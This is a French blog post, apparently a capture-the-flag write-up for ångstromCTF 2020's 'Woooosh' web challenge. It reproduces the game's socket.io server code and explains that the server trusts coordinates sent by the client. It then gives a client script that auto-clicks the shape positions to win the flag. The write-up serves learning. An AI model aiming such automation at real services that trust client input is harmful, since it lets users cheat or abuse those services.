</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>dist</span><span class=p>(</span><span class=nx>a</span><span class=p>,</span> <span class=nx>b</span><span class=p>,</span> <span class=nx>c</span><span class=p>,</span> <span class=nx>d</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>sqrt</span><span class=p>(</span><span class=nb>Math</span><span class=p>.</span><span class=nx>pow</span><span class=p>(</span><span class=nx>c</span> <span class=o>-</span> <span class=nx>a</span><span class=p>,</span> <span class=mi>2</span><span class=p>),</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>pow</span><span class=p>(</span><span class=nx>d</span> <span class=o>-</span> <span class=nx>b</span><span class=p>,</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>morgan</span><span class=p>(</span><span class=s2>&#34;combined&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>express</span><span class=p>.</span><span class=kr>static</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s2>&#34;public&#34;</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>hbs</span> <span class=o>=</span> <span class=nx>exphbs</span><span class=p>.</span><span class=nx>create</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=nx>extname</span><span class=o>:</span> <span class=s2>&#34;.hbs&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>helpers</span><span class=o>:</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>engine</span><span class=p>(</span><span class=s2>&#34;hbs&#34;</span><span class=p>,</span> <span class=nx>hbs</span><span class=p>.</span><span class=nx>engine</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s2>&#34;view engine&#34;</span><span class=p>,</span> <span class=s2>&#34;hbs&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s2>&#34;views&#34;</span><span class=p>,</span> <span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s2>&#34;views&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>io</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s2>&#34;connection&#34;</span><span class=p>,</span> <span class=nx>client</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>info</span><span class=p>(</span><span class=sb>`Client connected [id=</span><span class=si>${</span><span class=nx>client</span><span class=p>.</span><span class=nx>id</span><span class=si>}</span><span class=sb>]`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>game</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>setTimeout</span><span class=p>(</span><span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>client</span><span class=p>.</span><span class=nx>disconnect</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;err&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=mi>1</span> <span class=o>*</span> <span class=mi>60</span> <span class=o>*</span> <span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>endGame</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>game</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>game</span><span class=p>.</span><span class=nx>score</span> <span class=o>&gt;</span> <span class=mi>20</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>client</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;disp&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                        <span class=sb>`Good job! You&#39;re so good at this! The flag is </span><span class=si>${</span><span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>FLAG</span><span class=si>}</span><span class=sb>!`</span>
</span></span><span class=line><span class=cl>                    <span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>client</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;disp&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;Wow you&#39;re terrible at this! No flag for you!&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=nx>game</span> <span class=o>=</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;err&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>client</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s2>&#34;start&#34;</span><span class=p>,</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>console</span><span class=p>.</span><span class=nx>info</span><span class=p>(</span><span class=s2>&#34;Start message receive&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>game</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>client</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;disp&#34;</span><span class=p>,</span> <span class=s2>&#34;Game already started.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>game</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>shapes</span><span class=o>:</span> <span class=nx>genShapes</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>                    <span class=nx>score</span><span class=o>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>                <span class=p>};</span>
</span></span><span class=line><span class=cl>                <span class=nx>game</span><span class=p>.</span><span class=kr>int</span> <span class=o>=</span> <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>endGame</span><span class=p>,</span> <span class=mi>10000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>client</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;shapes&#34;</span><span class=p>,</span> <span class=nx>game</span><span class=p>.</span><span class=nx>shapes</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>client</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;score&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;err&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=nx>client</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s2>&#34;click&#34;</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>x</span><span class=p>,</span> <span class=nx>y</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>game</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>x</span> <span class=o>!=</span> <span class=s2>&#34;number&#34;</span> <span class=o>||</span> <span class=k>typeof</span> <span class=nx>y</span> <span class=o>!=</span> <span class=s2>&#34;number&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>dist</span><span class=p>(</span><span class=nx>game</span><span class=p>.</span><span class=nx>shapes</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>x</span><span class=p>,</span> <span class=nx>game</span><span class=p>.</span><span class=nx>shapes</span><span class=p>[</span><span class=mi>1</span><span class=p>].</span><span class=nx>y</span><span class=p>,</span> <span class=nx>x</span><span class=p>,</span> <span class=nx>y</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>10</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>game</span><span class=p>.</span><span class=nx>score</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nx>game</span><span class=p>.</span><span class=nx>shapes</span> <span class=o>=</span> <span class=nx>genShapes</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nx>client</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;shapes&#34;</span><span class=p>,</span> <span class=nx>game</span><span class=p>.</span><span class=nx>shapes</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>client</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;score&#34;</span><span class=p>,</span> <span class=nx>game</span><span class=p>.</span><span class=nx>score</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;err&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=nx>client</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s2>&#34;disconnect&#34;</span><span class=p>,</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>game</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>clearTimeout</span><span class=p>(</span><span class=nx>game</span><span class=p>.</span><span class=kr>int</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nx>game</span> <span class=o>=</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;err&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>render</span><span class=p>(</span><span class=s2>&#34;home&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>serv</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=nx>port</span><span class=p>,</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`Server listening on port </span><span class=si>${</span><span class=nx>port</span><span class=si>}</span><span class=sb>!`</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></div><p>Dans un premier temps, on remarque qu&rsquo;il s&rsquo;agit d&rsquo;un serveur <a href=https://socket.io target=_blank rel="noopener noreffer">socket.io</a>. Je suppose déjà qu&rsquo;il va falloir implémenter un client afin de simuler le comportement attendu (à savoir cliquer sur le cercle).<br>Le fonctionnement d&rsquo;un serveur <code>socket.io</code> est assez simple. Il attendu qu&rsquo;un client se connecte avec <code>io.on("connection", client => {</code> pour commencer une session. Ensuite, il va attendre des messages du client pour effectuer certaines actions (avec les <code>client.on(&lt;action>)</code>) et il peut également envoyer des messages au client avec <code>client.emit(&lt;action>, &lt;valeur>)</code>.</p><p>Lorsqu&rsquo;un utilisateur va cliquer sur le bouton <strong>Start game</strong> la page web, le socket client va envoyer l&rsquo;action <code>start</code> au serveur. Lors de la réception de ce message, le serveur vérifie si un partie est déjà en cours auquel il demande au client d&rsquo;afficher le message <code>Game already started.</code>. Sinon, il instancie une partie en générant un tableau de formes puis en initialisant le score à 0. Pour finir, il va envoyer toutes ces informations au client pour qu&rsquo;il affiche les formes et le score.</p><p>Lorsqu&rsquo;un utilisateur effectue un clique dans la zone prévu, le client envoie le message <code>click</code> au serveur. Et c&rsquo;est cette fonction qui va nous intéresser car pour vérifier l&rsquo;endroit sur lequel à cliquer l&rsquo;utilisateur correspond bien à la position du cercle il comprare la position envoyé et la position des premier éléments du tableau de formes. Cela signifie donc que les positions du cercle seront toujours dans l&rsquo;index <code>0</code> et <code>1</code> du tableau <code>game.shapes</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>dist</span><span class=p>(</span><span class=nx>game</span><span class=p>.</span><span class=nx>shapes</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>x</span><span class=p>,</span> <span class=nx>game</span><span class=p>.</span><span class=nx>shapes</span><span class=p>[</span><span class=mi>1</span><span class=p>].</span><span class=nx>y</span><span class=p>,</span> <span class=nx>x</span><span class=p>,</span> <span class=nx>y</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>10</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>game</span><span class=p>.</span><span class=nx>score</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Avec cette information, on peut facilement créer un client socket.io pour qu&rsquo;à chaque fois qu&rsquo;il reçoit message <code>shapes</code> avec comme valeur le tableau de forme, il renvoie un message <code>click</code> au serveur avec comme valeur les valeurs contenu dans l&rsquo;index <code>1</code> et <code>0</code> du tableau reçu.</p><p>Voici le script final:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span>
</span></span><span class=line><span class=cl>    <span class=nx>io</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;socket.io-client&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=nx>ioClient</span> <span class=o>=</span> <span class=nx>io</span><span class=p>.</span><span class=nx>connect</span><span class=p>(</span><span class=s2>&#34;https://woooosh.2020.chall.actf.co/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>ioClient</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;start&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>ioClient</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s2>&#34;shapes&#34;</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>shapes</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>shapes</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>x</span><span class=p>,</span> <span class=nx>shapes</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>ioClient</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s2>&#34;click&#34;</span><span class=p>,</span> <span class=nx>shapes</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>x</span><span class=p>,</span> <span class=nx>shapes</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;err&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=nx>ioClient</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s2>&#34;score&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>msg</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=nx>console</span><span class=p>.</span><span class=nx>info</span><span class=p>(</span><span class=s2>&#34;Score: &#34;</span><span class=p>,</span> <span class=nx>msg</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nx>ioClient</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s2>&#34;disp&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>msg</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=nx>console</span><span class=p>.</span><span class=nx>info</span><span class=p>(</span><span class=s2>&#34;Disp&#34;</span><span class=p>,</span> <span class=nx>msg</span><span class=p>))</span>
</span></span></code></pre></div><p>Je oublié de prendre un screenshot et de noter le flag lorsque j&rsquo;ai lancé le script, car comme les serveur sont situés au US, et que je suis basé en EU, le temps de latence est impressionnant et j&rsquo;ai seulement le temps de marquer 4 points, alors que sur l&rsquo;instance européenne déployée par les admins du Angstrom j&rsquo;ai pu marquer plus de 30 points et donc d&rsquo;avoir le flag.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2020-03-20</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/ctf/>CTF</a>,&nbsp;<a href=/tags/web/>Web</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/wi_fic_19/ class=prev rel=prev title="📋 Capture.The.FIC 2019 - Forensic - Do you forensic ANALyst job"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>📋 Capture.The.FIC 2019 - Forensic - Do you forensic ANALyst job</a>
<a href=/posts/wu_ecsc_20/ class=next rel=next title="📋 FCSC 2020 - Web - Bestiary">📋 FCSC 2020 - Web - Bestiary<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2019 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Thomza</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>